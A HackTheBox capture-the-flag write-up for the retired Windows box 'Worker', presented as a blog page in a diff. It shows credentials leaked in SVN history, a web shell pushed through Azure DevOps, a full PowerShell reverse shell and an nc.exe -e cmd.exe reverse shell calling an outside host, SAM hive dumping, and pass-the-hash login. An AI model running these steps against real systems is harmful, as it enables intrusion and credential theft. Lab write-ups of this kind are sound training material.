@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Worker Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Worker Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Worker Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Worker is a Windows based machine that was active since August 15th of 2020 to January 30th of 2021, we will start this machine cloning a repository stored on Subversion, on this repository we will get a subdomain where we will find an instance of Azure Devops, also on the history of this repository we will get some valid credentials for Azure, the machine serves a lot of subdomains and we will be able to modify them throught Azure, so we will upload a web shell and then spawn a reverse shell, enumerating the machine we will find some credentials to a user with higher privileges, using this credentials we will be able to queue commands on Azure which runs as Authorithy\system finishing the machine." />
+<meta property="og:description" content="Worker is a Windows based machine that was active since August 15th of 2020 to January 30th of 2021, we will start this machine cloning a repository stored on Subversion, on this repository we will get a subdomain where we will find an instance of Azure Devops, also on the history of this repository we will get some valid credentials for Azure, the machine serves a lot of subdomains and we will be able to modify them throught Azure, so we will upload a web shell and then spawn a reverse shell, enumerating the machine we will find some credentials to a user with higher privileges, using this credentials we will be able to queue commands on Azure which runs as Authorithy\system finishing the machine." />
+<link rel="canonical" href="http://localhost:8000/Worker" />
+<meta property="og:url" content="http://localhost:8000/Worker" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/worker/worker.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-01T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/worker/worker.png" />
+<meta property="twitter:title" content="Worker Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-02-01T00:00:00-05:00","datePublished":"2021-02-01T00:00:00-05:00","description":"Worker is a Windows based machine that was active since August 15th of 2020 to January 30th of 2021, we will start this machine cloning a repository stored on Subversion, on this repository we will get a subdomain where we will find an instance of Azure Devops, also on the history of this repository we will get some valid credentials for Azure, the machine serves a lot of subdomains and we will be able to modify them throught Azure, so we will upload a web shell and then spawn a reverse shell, enumerating the machine we will find some credentials to a user with higher privileges, using this credentials we will be able to queue commands on Azure which runs as Authorithy\\system finishing the machine.","headline":"Worker Writeup [HTB]","image":"http://localhost:8000/assets/images/worker/worker.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Worker"},"url":"http://localhost:8000/Worker"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/worker/worker.png/../banner.png>
+  
+  <h2>Worker Writeup [HTB]</h2>
+  <time datetime="2021-02-01T00:00:00-05:00" class="by-line">01 Feb 2021</time>
+  <p>Worker is a Windows based machine that was active since August 15th of 2020 to January 30th of 2021, we will start this machine cloning a repository stored on Subversion, on this repository we will get a subdomain where we will find an instance of Azure Devops, also on the history of this repository we will get some valid credentials for Azure, the machine serves a lot of subdomains and we will be able to modify them throught Azure, so we will upload a web shell and then spawn a reverse shell, enumerating the machine we will find some credentials to a user with higher privileges, using this credentials we will be able to queue commands on Azure which runs as Authorithy\system finishing the machine.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.203
+nmap -sC -sV -p 5985,3690,80, -Pn -o scan.txt 10.10.10.203
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<p>We only see three ports, a webpage on port 80, a Subversion server on port 3690 and WSMAN on port 5985, if we check the webpage we can’t find anything interesting we clone the Subversion server, unlike Git we don’t need the repository name to clone, there is a default repository that will be cloned, also unlike Git the repository will be cloned in our current directory it won’t create a new one, so we have to create a directory before cloning it, to clone the repository we use the command <code class="language-plaintext highlighter-rouge">svn checkout svn://10.10.10.203:3690</code>, after running the command we get a directory called “dimension.worker.htb” and a .txt file.</p>
+
+<p><img src="/assets/images/worker/svn.png" alt="" /></p>
+
+<p>On moved.txt we find the next message.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This repository has been migrated and will no longer be maintaned here.
+You can find the latest version at: http://devops.worker.htb
+
+// The Worker team :)
+</code></pre></div></div>
+
+<p>We got another subdomain, if we add it to our hosts file and try to access to it we are prompted to insert some credentials.</p>
+
+<p><img src="/assets/images/worker/devopslogin.png" alt="" /></p>
+
+<p>We don’t have any, so we go back to our cloned repository, just like Git we can check the history of the respository, to do it we run <code class="language-plaintext highlighter-rouge">svn log</code>.</p>
+
+<p><img src="/assets/images/worker/svnlog.png" alt="" /></p>
+
+<p>We got a username “nathen” but we still need to get the password, so we check the commits searching for it, and we found it on the second one, wendel98. <code class="language-plaintext highlighter-rouge">svn diff -r 2</code>.</p>
+
+<p><img src="/assets/images/worker/svndiff.png" alt="" /></p>
+
+<p>Using these credentials we can access to devops.worker.htb, and we found that Azure Devops is running there.</p>
+
+<p><img src="/assets/images/worker/azuredevops.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>Exploring throught the Web Application we find some git repositories stored there.</p>
+
+<p><img src="/assets/images/worker/azuregit.png" alt="" /></p>
+
+<p>If we enumerate the subdomain “dimension.worker.htb” we will find a lot of other subdomains inside the machine, well those repositories belongs to those subdomains, so we can upload a webshell to any page. We can’t push directly into the repository, but we can make a pull request, so we have to do a couple of steps, we can do this on any repository, first we create another branch, we can push directly into this branch, so we click on “upload file” and select our webshell (on parrot there is one available on /usr/share/webshells/aspx/cmdasp.aspx), then we make the pull request for the change and select a work item (if you don’t do it you won’t be able to merge to the master branch), you can see which work items are available on Boards &gt; Work Items. Finally we aprove the request a merge to the master branch, on this case the shell was named “subte.aspx”.</p>
+
+<p><img src="/assets/images/worker/shelluploaded.png" alt="" /></p>
+
+<p>Now we can go “http://alpha.worker.htb/subte.aspx” (we go there because we modified the alpha repository, if we had modified another repository we would had to go the corresponding subdomain), there we will find our webshell.</p>
+
+<p><img src="/assets/images/worker/webshell.png" alt="" /></p>
+
+<p>There is a running task that cleans everything after a short amount of time, so we have to move quickly if we don’t want to do everything again, so we generate a reverse shell command using msfvenom: <code class="language-plaintext highlighter-rouge">msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.15.120 LPORT=54321</code>, we get the next command (please notice I separated the command in several lines so it gets showed here, msfvenom generates a one liner).</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nv">$a</span><span class="o">=</span><span class="s1">'10.10.15.120'</span><span class="p">;</span><span class="nv">$b</span><span class="o">=</span><span class="mi">54321</span><span class="p">;</span><span class="nv">$c</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">system.net.sockets.tcpclient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$nb</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Byte</span><span class="p">[]</span><span class="w"> </span><span class="nv">$c</span><span class="o">.</span><span class="nf">ReceiveBufferSize</span><span class="p">;</span><span class="nv">$ob</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Byte</span><span class="p">[]</span><span class="w"> </span><span class="nx">65536</span><span class="p">;</span><span class="nv">$eb</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> 
+</span><span class="n">System.Byte</span><span class="p">[]</span><span class="w"> </span><span class="nx">65536</span><span class="p">;</span><span class="nv">$e</span><span class="o">=</span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Text.UTF8Encoding</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Diagnostics.Process</span><span class="p">;</span><span class="w">
+</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StartInfo</span><span class="o">.</span><span class="nf">FileName</span><span class="o">=</span><span class="s1">'cmd.exe'</span><span class="p">;</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StartInfo</span><span class="o">.</span><span class="nf">RedirectStandardInput</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StartInfo</span><span class="o">.</span><span class="w">
+</span><span class="n">RedirectStandardOutput</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StartInfo</span><span class="o">.</span><span class="nf">RedirectStandardError</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StartInfo</span><span class="o">.</span><span class="nf">UseShellExecute</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$q</span><span class="o">=</span><span class="nv">$p</span><span class="o">.</span><span class="w">
+</span><span class="n">Start</span><span class="p">();</span><span class="nv">$is</span><span class="o">=</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StandardInput</span><span class="p">;</span><span class="nv">$os</span><span class="o">=</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StandardOutput</span><span class="p">;</span><span class="nv">$es</span><span class="o">=</span><span class="nv">$p</span><span class="o">.</span><span class="nf">StandardError</span><span class="p">;</span><span class="nv">$osread</span><span class="o">=</span><span class="nv">$os</span><span class="o">.</span><span class="nf">BaseStream</span><span class="o">.</span><span class="w">
+</span><span class="n">BeginRead</span><span class="p">(</span><span class="nv">$ob</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$ob</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">);</span><span class="nv">$esread</span><span class="o">=</span><span class="nv">$es</span><span class="o">.</span><span class="nf">BaseStream</span><span class="o">.</span><span class="nf">BeginRead</span><span class="p">(</span><span class="nv">$eb</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$eb</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> 
+</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">);</span><span class="nv">$c</span><span class="o">.</span><span class="nf">connect</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span><span class="nv">$s</span><span class="o">=</span><span class="nv">$c</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();</span><span class="kr">while</span><span class="w"> </span><span class="p">(</span><span class="bp">$true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="n">start-sleep</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">100</span><span class="p">;</span><span class="w">    </span><span class="kr">if</span><span class="w"> 
+</span><span class="p">(</span><span class="nv">$osread</span><span class="o">.</span><span class="nf">IsCompleted</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="nv">$osread</span><span class="o">.</span><span class="nf">Result</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">      </span><span class="nv">$r</span><span class="o">=</span><span class="nv">$os</span><span class="o">.</span><span class="nf">BaseStream</span><span class="o">.</span><span class="nf">EndRead</span><span class="p">(</span><span class="nv">$osread</span><span class="p">);</span><span class="w">      </span><span class="nv">$s</span><span class="o">.</span><span class="w">
+</span><span class="n">Write</span><span class="p">(</span><span class="nv">$ob</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span><span class="w">      </span><span class="nv">$s</span><span class="o">.</span><span class="nf">Flush</span><span class="p">();</span><span class="w">      </span><span class="nv">$osread</span><span class="o">=</span><span class="nv">$os</span><span class="o">.</span><span class="nf">BaseStream</span><span class="o">.</span><span class="nf">BeginRead</span><span class="p">(</span><span class="nv">$ob</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$ob</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">,</span><span class="w"> 
+</span><span class="bp">$null</span><span class="p">);</span><span class="w">    </span><span class="p">}</span><span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$esread</span><span class="o">.</span><span class="nf">IsCompleted</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="nv">$esread</span><span class="o">.</span><span class="nf">Result</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">      </span><span class="nv">$r</span><span class="o">=</span><span class="nv">$es</span><span class="o">.</span><span class="nf">BaseStream</span><span class="o">.</span><span class="nf">EndRead</span><span class="w">
+</span><span class="p">(</span><span class="nv">$esread</span><span class="p">);</span><span class="w">      </span><span class="nv">$s</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$eb</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span><span class="w">      </span><span class="nv">$s</span><span class="o">.</span><span class="nf">Flush</span><span class="p">();</span><span class="w">      </span><span class="nv">$esread</span><span class="o">=</span><span class="nv">$es</span><span class="o">.</span><span class="nf">BaseStream</span><span class="o">.</span><span class="nf">BeginRead</span><span class="p">(</span><span class="nv">$eb</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> 
+</span><span class="nv">$eb</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">);</span><span class="w">    </span><span class="p">}</span><span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$s</span><span class="o">.</span><span class="nf">DataAvailable</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">      </span><span class="nv">$r</span><span class="o">=</span><span class="nv">$s</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$nb</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$nb</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">      </span><span class="kr">if</span><span class="w"> 
+</span><span class="p">(</span><span class="nv">$r</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">          </span><span class="kr">break</span><span class="p">;</span><span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w">          </span><span class="nv">$str</span><span class="o">=</span><span class="nv">$e</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$nb</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span><span class="w">          </span><span class="nv">$is</span><span class="o">.</span><span class="nf">write</span><span class="w">
+</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span><span class="w">      </span><span class="p">}</span><span class="w">    </span><span class="p">}</span><span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nf">Connected</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nf">Client</span><span class="o">.</span><span class="nf">Poll</span><span class="p">(</span><span class="nx">1</span><span class="p">,[</span><span class="n">System.Net.Sockets.</span><span class="w">
+</span><span class="n">SelectMode</span><span class="p">]::</span><span class="nx">SelectRead</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="nv">$c</span><span class="o">.</span><span class="nf">Client</span><span class="o">.</span><span class="nf">Available</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nx">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">        </span><span class="kr">break</span><span class="p">;</span><span class="w">    </span><span class="p">}</span><span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$p</span><span class="o">.</span><span class="nf">ExitCode</span><span class="w"> </span><span class="o">-ne</span><span class="w"> 
+</span><span class="bp">$null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">        </span><span class="kr">break</span><span class="p">;</span><span class="w">    </span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We start our listener with <code class="language-plaintext highlighter-rouge">rlwrap nc -lvp 54321</code>, paste the reverse shell command on the webshell and we will get a reverse shell.</p>
+
+<p><img src="/assets/images/worker/shell1.png" alt="" /></p>
+
+<p>We run winpeas and find out that there is another drive, we can get the available drives through WMI, <code class="language-plaintext highlighter-rouge">wmic localdisk get name</code>.</p>
+
+<p><img src="/assets/images/worker/wmic.png" alt="" /></p>
+
+<p>After searching on W: drive for a while we find a file called “passwd” under  “W:\svnrepos\www\conf", so we retrieve it a get a lot of credentials.</p>
+
+<p><img src="/assets/images/worker/passwd.png" alt="" /></p>
+
+<p>There are another two users on the machine “robisl” and “restorer”, on the file we get the password of “robisl”, “wolves11”, we can use evil-winrm to get a shell as him and get “user.txt”.</p>
+
+<p><img src="/assets/images/worker/shell2.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>When I found out that Azure Devops was running on the machine I searched for a way of getting code execution, here is a small <a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/tasks/utility/batch-script?view=azure-devops">example</a> on microsoft’s page, since we didn’t have permissions to do it we had to go with the webshell, but with this new account we can try it again, so we login as robisl. Then using our shell we upload nc on a directory that we created, “C:\Users\robisl\Links\empty”, then we have to create two files to upload to the git repository, nothing.bat.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\robisl\Links\empty\nc.exe 10.10.15.120 4433 -e cmd.exe
+</code></pre></div></div>
+
+<p>And rev.yaml.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">steps</span><span class="pi">:</span>
+
+<span class="pi">-</span> <span class="na">task</span><span class="pi">:</span> <span class="s">BatchScript@1</span>
+
+  <span class="na">displayName</span><span class="pi">:</span> <span class="s1">'</span><span class="s">Run</span><span class="nv"> </span><span class="s">script</span><span class="nv"> </span><span class="s">nothing.bat'</span>
+
+  <span class="na">inputs</span><span class="pi">:</span>
+
+    <span class="na">filename</span><span class="pi">:</span> <span class="s">nothing.bat</span>
+</code></pre></div></div>
+
+<p>Now we create a new branch on the repository, and upload there the two files, “rev.yaml” and “nothing.bat”, there is no need to merge them to the master branch, now we go to pipelines and create a new one, we click on “Use the classic editor”, on the next step we have to select the branch where we uploaded the files, on this case “hithere”.</p>
+
+<p><img src="/assets/images/worker/pipebranch.png" alt="" /></p>
+
+<p>Then we select “YAML”, now we select an agent pool and our yaml file.</p>
+
+<p><img src="/assets/images/worker/pipequeue.png" alt="" /></p>
+
+<p>With that we save and queue the file, after waiting for a while we will get a shell as authority\system.</p>
+
+<p><img src="/assets/images/worker/shell3.png" alt="" /></p>
+
+<p>But there is a problem, this shell won’t last to long, it is killed after a short time, so we have to do something to keep access, so on this case we will dump the sam and system files, to do that we use the command <code class="language-plaintext highlighter-rouge">reg SAVE HKLM\SAM C:\Users\robisl\Links\empty\sam</code>, the same with system file, we saved them on a directory where we have access with “robisl”, so we can download it with evil-winrm, once we have download them we use secretsdump to get the hashes, <code class="language-plaintext highlighter-rouge">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system local</code></p>
+
+<p><img src="/assets/images/worker/secretsdump.png" alt="" /></p>
+
+<p>Now that we have the NT hash of administrator we can perfom a pass the hash to get access as him on the machine, retrieve root.txt and finish with the box, <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.203 -u Administrator -H ea60b1a1d2e4ae93765e43aef4442318</code>.</p>
+
+<p><img src="/assets/images/worker/shell4.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#windows"> Windows</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
